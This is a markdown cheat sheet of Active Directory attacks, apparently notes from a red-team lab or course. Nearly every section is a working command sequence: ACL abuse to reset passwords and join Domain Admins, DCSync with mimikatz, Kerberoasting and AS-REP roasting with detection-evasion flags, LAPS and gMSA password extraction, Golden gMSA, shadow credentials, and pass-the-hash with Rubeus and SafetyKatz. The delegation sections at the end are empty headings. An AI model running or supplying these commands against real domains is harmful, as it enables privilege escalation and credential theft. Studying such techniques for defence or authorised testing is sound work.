# ACL Abuse
Access Control Lists (ACLs) are an essential part of Windows Active Directory security. They are used to control access to resources such as files, folders, and network shares. However, ACLs can be abused by attackers to gain unauthorized access to sensitive data.

One common ACL abuse technique is known as "over-permissioning." This occurs when an administrator grants more permissions than necessary to a user or group. For example, granting "Full Control" to a user who only needs "Read" access. This can lead to unintended consequences, such as data leaks or unauthorized modifications.

Lets discuss the various permissions and how these can be abused:

## GenericAll, GenericWrite, GenericProperty

### When these permissions are assigned to a **user**:
Change password of a user object.
```
net user<username> <password>  /domain
```

Targeted Kerberoasting ( Three steps )
1.  Set SPN
```
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
```

2. Get Hash of the username
```
Rubeus.exe kerberoast /user:<username> /nowrap
```

3. Clear the SPN on the user
```
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

Disable Preauthentication
```
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

### When Permissions are assigned to a Group.
Add to a group
```
netgroup "domain admins" spotless/add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

### When Permissions are assigned to a Computer.

We can perform resource based constrained delegation.

## GenericWrite

### On a User

- Overwrite the logon script path of the Victim user.
```
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

## AllExtendedRights
1. When permission assigned to a user or group, the entity can
- Password Reset
- Add to a group

## Self Membership
- Add to a group
```
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local";
```

## ExtendedRight on User-Force-Change-Password (ObjectType)
- Password Reset
```
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity testuser -Domain techcorp.local -AccountPassword (ConvertTo-SecureString 'password@123' -AsPlainText -Force) -Verbose
```

## WriteProperty
- Add to a group

## WriteOwner
- Change the objects owner
```
Set-DomainObjectOwner -Identity testuser -Domain techcorp.local -OwnerIdentity "us\studentuser19"
```
After modification, check the owner.
```
Get-ADObject -Identity "CN=Users,DC=contoso,DC=com" -Properties Owner | Select-Object -ExpandProperty Owner
```

## WriteDACL
To perform WriteDACL operation, one need to be an owner of the group and need to have
WriteOwner permission. In this case, the user can give generic all permissions to an entity.
```
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local" $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier]) $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow" $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE) $ADSI.psbase.commitchanges()
```
## DCSync
DCSync is a technique used by attackers to request and replicate account password data from a domain controller (DC) in an Active Directory (AD) environment. It allows an attacker with sufficient privileges to impersonate a domain controller and request the password hash data for a specific user or all users in the domain.

```
sudo ./mimikatz.exe
lsadump::dcsync /user:<username>
lsadump::dcsync /all
lsadump::dcsync /user:<username> > password.txt
```

# Kerberoasting
Kerberoasting is a technique used to extract service account credentials from a Windows Active Directory environment. It takes advantage of the way Kerberos authentication works in Windows.

When a user authenticates to a service, a Kerberos ticket is issued that contains the user's encrypted password hash. Service accounts, which are used to run services on Windows machines, also have password hashes stored in Active Directory. These password hashes can be extracted using the Kerberoasting technique.

## Find Service Accounts
```
\\AD Module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

\\PowerView
Get-DomainUser –SPN
```

## Dump the kerberoasting accounts.
To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of MDI - 0x17 stands for rc4-hmac), look for Kerberoastable accounts that only support RC4_HMAC.
```
Rubeus.exe kerberoast /stats /rc4opsec
```

Use Rubeus to request a TGS.
```
Rubeus.exe kerberoast /user:serviceaccount /simple /rc4opsec
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```
## Hash Cracking
```
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

# Targeted Kerberoasting
Targeted Kerberoasting is a variation of the Kerberoasting attack that focuses on specific user accounts rather than service accounts. In a targeted Kerberoasting attack, an attacker identifies high-value user accounts, such as executives or IT administrators, and requests a Kerberos service ticket for those accounts from the domain controller.

The attacker can then extract the encrypted password hash from the service ticket and attempt to crack it offline to obtain the plaintext password. Once the attacker has the plaintext password, they can use it to gain access to the targeted user's account and potentially sensitive data.


Find "Write" Permissions
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}
```

Find SPN
```
Get-DomainUser -Identity support1user | select serviceprincipalname
    
Get-ADUser -Identity support1user -Properties  ServicePrincipalName | select ServicePrincipalName
```

Set-SPN
```
\\ Using PowerView
Set-DomainObject -Identity support1user -Set @{serviceprincipalname='us/myspnX'}

\\ Using AD Module        
Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='us/myspnX'}
```

Kerberoasting
```
Rubeus.exe kerberoast /outfile:targetedhashes.txt

john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt
```

# AS-REP Kerberoast
Find Users without kerberos Preauthentication or Preauth disabled.
```
Get-ASREPHash -UserName Control169User | Out-File C:\Users\student169\Desktop\control169.hash
```
Or 
```
Invoke-ASREPRoast -Verbose
```

# LAPS Abuse
To find users who can read the passwords in clear text machines in OUs:
```
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object
{($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and
($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object
{$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
```

Read Cleartext passwords from machines. Execute as the permitted user.
```
Get-DomainObject -Identity <targetmachine$> | select -ExpandProperty ms-mcs-admpwd
```

The same can also be accomplished with AD Module, there are 3 steps:

1. Import All Modules
```
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll

Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1

Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1 -Verbose
```

2. Get Permissions
```
C:\AD\Tools\Get-LapsPermissions.ps1
```

3. View Password
```
\\AD Module
Get-ADComputer -Identity us-mailmgmt -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
```

Or Using LAPs Module
```
Get-AdmPwdPassword -ComputerName us-mailmgmt
```

# gMSA ( Group Managed Service Accounts )
A group Managed Service Account (gMSA) provides automatic password management, SPN management and delegated administration for service accounts across multiple servers. 

## Enumerate gMSAs and User
A gMSA has objectclass **msDS-GroupManagedServiceAccount**. This can be used to find the accounts.

Find Group Managed Accounts.
```
Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'
```

With AD Module:
```
Get-ADServiceAccount -Filter *
Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
```

## Over Pass-the-Hash
From the above step, we would found the gMSA account. Once the user is the compromised, login as this user via Over-PTH.

Using Rubeus
```
Rubeus.exe asktgt /user:provisioningsvc /aes256:a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a /domain:us.techcorp.local  /createnetonly:C:\Windows\System32\cmd.exe /show
```

using Loader and Mimikatz
```
.\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "Sekurlsa::pth /user:provisioningsvc /domain:us.techcorp.local /aes256:a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a /run:cmd.exe" "exit"
```

## Fetch Password Blob
The attribute 'msDS-ManagedPassword' stores the password blob in binary form of MSDS-MANAGEDPASSWORD_BLOB.

```
$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS- ManagedPassword).'msDS-ManagedPassword'
```

Once we have compromised a principal that can read the blob. Use ADModule to read and DSInternals to compute NTLM hash

```
Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1

$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob

ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
```

## PTH and get Privs of gMSA
```
sekurlsa::pth /user:jumpone /domain:us.techcorp.local /ntlm:0a02c684cc0fa1744195edd1aec43078
```

# Golden GMSA
Enumerate all gMSA
```
GoldenGMSA.exe gmsainfo
GoldenGMSA.exe gmsainfo --sid S-1-5-21-1437000690-1664695696-1586295871-1112
```

With Domain admin privileges:
```
GoldenGMSA.exe kdsinfo
GoldenGMSA.exe kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb
```

Once we have the KDS Key, we can compute this offline:
```
GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAA(snipped)m45
```

# Shadow Credentials

## Applied on User Object

Find WritePermission on targetObject
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}
```

Add the Shadow Credential.
```
Whisker.exe add /target:supportXuser
```

Using PowerView, see if the Shadow Credential is added.
```
Get-DomainUser -Identity supportXuser
```

## Applied on Computer Object

Enumerate permissions
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'mgmtadmin’}
```

Get TGT for mgmtadmin
```
SafetyKatz.exe "sekurlsa::pth /user:mgmtadmin /domain:us.techcorp.local /aes256:32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b4 19db24c00f /run:cmd.exe" "exit"
```

Add Shadow Creds
```
Whisker.exe add /target:us-helpdesk$
```

The output from Whisker would have Rubeus Command.
```
Whisker.exe add /target:"TARGET_SAMNAME" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
```

We can also validate whether the shadow credentials were added:
```
Get-DomainComputer -Identity us-helpdesk
```

Request TGS with Hash
```
Rubeus.exe s4u /self /impersonateuser:Administrator /dc:us-dc.techcorp.local /ptt /ticket:doIGtd[.*]TLsb2NhbA== /altservice:cifs/us-helpdesk.us.techcorp.local
```

The output of Rubeus would contain the base64 TGT which can injected into a session via PTT.

# Delegation

## Unconstrained

## Constrained ( Without Kerberos Authentication )

## Constrained Delegation ( With Kerberos )

## Resource Based Constrained Delegation





